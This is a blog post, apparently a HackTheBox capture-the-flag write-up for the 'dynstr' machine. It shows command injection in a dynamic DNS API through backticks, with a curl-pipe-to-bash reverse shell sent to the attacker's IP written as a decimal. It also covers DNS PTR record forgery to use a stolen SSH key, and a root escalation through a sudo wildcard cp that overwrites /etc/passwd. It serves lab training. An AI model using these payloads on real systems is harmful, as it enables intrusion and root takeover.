@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>dynstr Writeup [HTB]</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>dynstr Writeup [HTB] | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="dynstr Writeup [HTB]" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Dynstr is a Linux based machine that was active since June 12th of 2021 to October 16th, we will find a service for giving dynamic DNS, just like noip and who claim to use the same API, testing it we find out that it is vulnerable to command injection, bypass a small issue writing our IP without dots and getting a shell inside the machine, once inside the machine we find a SSH key inside the saved output of strace, but this key can only be used from certain domains, so we manipulate the PTR records on the DNS service to be able to use it, finally we see that we can execute a script with sudo rights that copies some files using a wildcard, so we abuse this to overwrite passwd file, add a user with uid 0 and finish with the machine." />
+<meta property="og:description" content="Dynstr is a Linux based machine that was active since June 12th of 2021 to October 16th, we will find a service for giving dynamic DNS, just like noip and who claim to use the same API, testing it we find out that it is vulnerable to command injection, bypass a small issue writing our IP without dots and getting a shell inside the machine, once inside the machine we find a SSH key inside the saved output of strace, but this key can only be used from certain domains, so we manipulate the PTR records on the DNS service to be able to use it, finally we see that we can execute a script with sudo rights that copies some files using a wildcard, so we abuse this to overwrite passwd file, add a user with uid 0 and finish with the machine." />
+<link rel="canonical" href="http://localhost:8000/dynstr" />
+<meta property="og:url" content="http://localhost:8000/dynstr" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/dynstr/dynstr.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-10-16T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/dynstr/dynstr.png" />
+<meta property="twitter:title" content="dynstr Writeup [HTB]" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2021-10-16T00:00:00-05:00","datePublished":"2021-10-16T00:00:00-05:00","description":"Dynstr is a Linux based machine that was active since June 12th of 2021 to October 16th, we will find a service for giving dynamic DNS, just like noip and who claim to use the same API, testing it we find out that it is vulnerable to command injection, bypass a small issue writing our IP without dots and getting a shell inside the machine, once inside the machine we find a SSH key inside the saved output of strace, but this key can only be used from certain domains, so we manipulate the PTR records on the DNS service to be able to use it, finally we see that we can execute a script with sudo rights that copies some files using a wildcard, so we abuse this to overwrite passwd file, add a user with uid 0 and finish with the machine.","headline":"dynstr Writeup [HTB]","image":"http://localhost:8000/assets/images/dynstr/dynstr.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/dynstr"},"url":"http://localhost:8000/dynstr"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/dynstr/dynstr.png/../banner.png>
+  
+  <h2>dynstr Writeup [HTB]</h2>
+  <time datetime="2021-10-16T00:00:00-05:00" class="by-line">16 Oct 2021</time>
+  <p>Dynstr is a Linux based machine that was active since June 12th of 2021 to October 16th, we will find a service for giving dynamic DNS, just like noip and who claim to use the same API, testing it we find out that it is vulnerable to command injection, bypass a small issue writing our IP without dots and getting a shell inside the machine, once inside the machine we find a SSH key inside the saved output of strace, but this key can only be used from certain domains, so we manipulate the PTR records on the DNS service to be able to use it, finally we see that we can execute a script with sudo rights that copies some files using a wildcard, so we abuse this to overwrite passwd file, add a user with uid 0 and finish with the machine.</p>
+
+<h1 id="enumeration"><a href="#header-1"></a>Enumeration</h1>
+
+<p>We start using masscan to find all the available ports and then use nmap to get more information about them.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan <span class="nt">-e</span> tun0 <span class="nt">--rate</span><span class="o">=</span>500 <span class="nt">-p</span> 0-65535 10.10.10.244
+nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 53,22,80, <span class="nt">-Pn</span> <span class="nt">-o</span> scan.txt 10.10.10.244
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+53/tcp open  domain  ISC BIND 9.16.1 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
+| dns-nsid: 
+|_  bind.version: 9.16.1-Ubuntu
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Dyna DNS
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>We find three ports open, SSH, DNS running with ISC BIND, and a webpage, so lets check the webpage.</p>
+
+<p><img src="/assets/images/dynstr/website.png" alt="" /></p>
+
+<p>The site says that they are giving a service like no-ip, using the same api, they give us the domains were we can get a subdomain and some credentials to use, so first we go to <a href="https://www.noip.com/integrate/request">noip</a> site to undertand how this site is supposed to work, there we see what parameters are accepted and it says thay they use basic authentication, so let’s try to get a subdomain and use nslookup to see if it gets set.</p>
+
+<p><img src="/assets/images/dynstr/noip.png" alt="" />
+<img src="/assets/images/dynstr/nslookup.png" alt="" /></p>
+
+<h1 id="gaining-access"><a href="#header-1"></a>Gaining Access</h1>
+
+<p>As we see the site is working as intended, we get the subdomain set to our address, now let’s test this API, since unless they are friends or something with the owners of noip, they should have just mimic the API, and it could have a lot of vulnerabilities, we see that if we put an invalid character the update fails.</p>
+
+<p><img src="/assets/images/dynstr/broken.png" alt="" /></p>
+
+<p>Testing with some common command injection payloads we get nothing, so let’s use ffuf to see which characters don’t break the update, <code class="language-plaintext highlighter-rouge">ffuf -u 'http://10.10.10.244/nic/update?hostname=aFUZZa.no-ip.htb&amp;myip=127.0.0.1' -H "Authorization: Basic ZHluYWRuczpzbmRhbnlk" -w ~/tools/SecLists-master/Fuzzing/special-chars.txt -fs 22</code>.</p>
+
+<p><img src="/assets/images/dynstr/ffuf.png" alt="" /></p>
+
+<p>We don’t have many characters, but we hane one useful, the backtick, for example if we run “echo a`id -u`a”, we will get the output of the command in the middle of the two As.</p>
+
+<p><img src="/assets/images/dynstr/backtick.png" alt="" /></p>
+
+<p>So let’s try running id.</p>
+
+<p><img src="/assets/images/dynstr/idtest.png" alt="" /></p>
+
+<p>It failed… But we saw that one doesn’t break the update, so maybe the value got breaks the update since it can be large with some symbols that break it, let’s try <code class="language-plaintext highlighter-rouge">id -u root</code>, we know that the output of that command is “0”, so it should create a domain with that name.</p>
+
+<p><img src="/assets/images/dynstr/idroot.png" alt="" />
+<img src="/assets/images/dynstr/nsroot.png" alt="" /></p>
+
+<p>It worked!, we have command execution, so let’s use the usual approach fetch a bash reverse shell and pipe it to bash, we saw that the pipe broke the update, but it wasn’t because the character was blocked, but it caused some kind of error on the server, since we will be executing commands it doesn’t matter.</p>
+
+<p><img src="/assets/images/dynstr/curl.png" alt="" /></p>
+
+<p>Here we face another issue, before executing our command it seems like there is a validation filter that checks that after the first dot on the request a valid domain is set, this blocks any interaction that we could try with out machine, but like everything we can bypass it, to do it we have to go back to networking lessons, if we remember an IP is no more than the decimal representation of the octets that forms it.</p>
+
+<p><img src="/assets/images/dynstr/octet.jpg" alt="" /></p>
+
+<p>So let’s test with localhost, 127.0.0.1, if we represent it on binary we get, 01111111 00000000 00000000 00000001, well we can join these octets and convert them to a decimal number, the result is 2130706433, why do we care?, well let’s try to ping it.</p>
+
+<p><img src="/assets/images/dynstr/ping.png" alt="" /></p>
+
+<p>It’s magic! As we see the machine understands it, and pings 127.0.0.1, se we don’t need any dot to reach our IP, to avoid making the math we can use some <a href="https://www.ipaddressguide.com/ip">sites</a> that make the job for us. So now we execute, “curl -u dynadns:sndanyd ‘http://10.10.10.244/nic/update?hostname=subt`curl+168431658:8000/shell|bash`e.no-ip.htb&amp;myip=10.10.16.42’”, and it will hang because our reverse shell will be executed.</p>
+
+<p><img src="/assets/images/dynstr/revshell.png" alt="" /></p>
+
+<p><img src="/assets/images/dynstr/shell1.png" alt="" /></p>
+
+<p>It would’ve been easier to use base64 to put our payload directly, but I wanted to bypass the “filter”.</p>
+
+<h1 id="lateral-movement">Lateral Movement</h1>
+
+<p>Exploring the machine we get to /home/bindmgr/support-case-C62796521, were we find the output of strace saved, and if we read “strace-C62796521.txt”, we will find a ssh key.</p>
+
+<p><img src="/assets/images/dynstr/stracessh.png" alt="" /></p>
+
+<p>If we try to connect to the machine with that key we won’t be able to, and it isn’t because the key isn’t valid, to know the reason we check the authorized_keys file.</p>
+
+<p><img src="/assets/images/dynstr/authorized.png" alt="" /></p>
+
+<p>On this file we can set more that just the allowed keys, we can also specify from were these keys are allowed, and on this case only machines that belongs to a .infra.dyna.htb domain can connect, it must be using its own DNS server to validate the IPs belonging to that domain to validate the use of the key, so let’s see what the update file does.</p>
+
+<p><img src="/assets/images/dynstr/update.png" alt="" /></p>
+
+<p>As we though it makes a validation of the domain after the first dot found, after that it runs nsupdate to add the IP to the subdomain, to validate its access it uses “/etc/bind/ddns.key” as key file, but if we go to “/etc/bind”, we can find another key file, infra.key, this is the key that we need to edit .infra.dyna.htb domains.</p>
+
+<p><img src="/assets/images/dynstr/infra.png" alt="" /></p>
+
+<p>With that key we can add ourselves to a domain under infra.dyna.htb, just like the update file does.</p>
+
+<p><img src="/assets/images/dynstr/updateinfra.png" alt="" /></p>
+
+<p>Anyways we still can’t access to the machine with the SSH key, why? Well when we connect to the machine it only knows our IP, we can’t say from which domain we are coming, we can validate that with nslookup, were if we try to search for our IP it won’t find it.</p>
+
+<p><img src="/assets/images/dynstr/revns.png" alt="" /></p>
+
+<p>So we need to understand DNS a little better, what we added is an A record, this record is used to convert a domain into an IP, but it doesn’t work backwards, to do so there is another record, the PTR record, so we add ourselves to that record and as we see now we can ask for our IP.</p>
+
+<p><img src="/assets/images/dynstr/nsptr.png" alt="" />
+<img src="/assets/images/dynstr/revdns.png" alt="" /></p>
+
+<p>And finally we can connect using the SSH key, and retrieve user.txt.</p>
+
+<p><img src="/assets/images/dynstr/shell2.png" alt="" /></p>
+
+<h1 id="privilege-escalation"><a href="#header-1"></a>Privilege Escalation</h1>
+
+<p>We check if we can run anything with sudo.</p>
+
+<p><img src="/assets/images/dynstr/sudo.png" alt="" /></p>
+
+<p>We see that we can run <code class="language-plaintext highlighter-rouge">/usr/local/bin/bindmgr.sh</code> as root, and the line that we can abuse of is this one: <code class="language-plaintext highlighter-rouge">cp .version * /etc/bind/named.bindmgr/</code>, the script checks that .version file contains a number and that it is greater than the number inside .version located at “/etc/bin/named.bindmgr/”, so to exploit this we will create two directories, 1 and 2, inside 1, we will create a symlink to passwd, <code class="language-plaintext highlighter-rouge">ln -s /etc/passwd passwd</code>, and a file called “-P”, <code class="language-plaintext highlighter-rouge">touch -- -P</code>, this will make cp to copy the symlink file as a symlink instead of copying the original file, then inside 2, we will copy the passwd file and add our own user with id 0, to generate the password we can use openssl, <code class="language-plaintext highlighter-rouge">openssl passwd -1 -salt 123 hacked</code>, both directories must have a .version file, and the one inside 2 has to have a number greater than the one inside 1, verifying the files.</p>
+
+<p><img src="/assets/images/dynstr/files.png" alt="" /></p>
+
+<p>Now we go to 1, and execute, <code class="language-plaintext highlighter-rouge">sudo /usr/local/bin/bindmgr.sh; cd ../2 ;sudo /usr/local/bin/bindmgr.sh</code>, and if we check the passwd file we will ser our user inside there.</p>
+
+<p><img src="/assets/images/dynstr/passwd.png" alt="" /></p>
+
+<p>Now if we su to that user we will get access as root and finish with the machine.</p>
+
+<p><img src="/assets/images/dynstr/root.png" alt="" /></p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#hackthebox"> HackTheBox</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
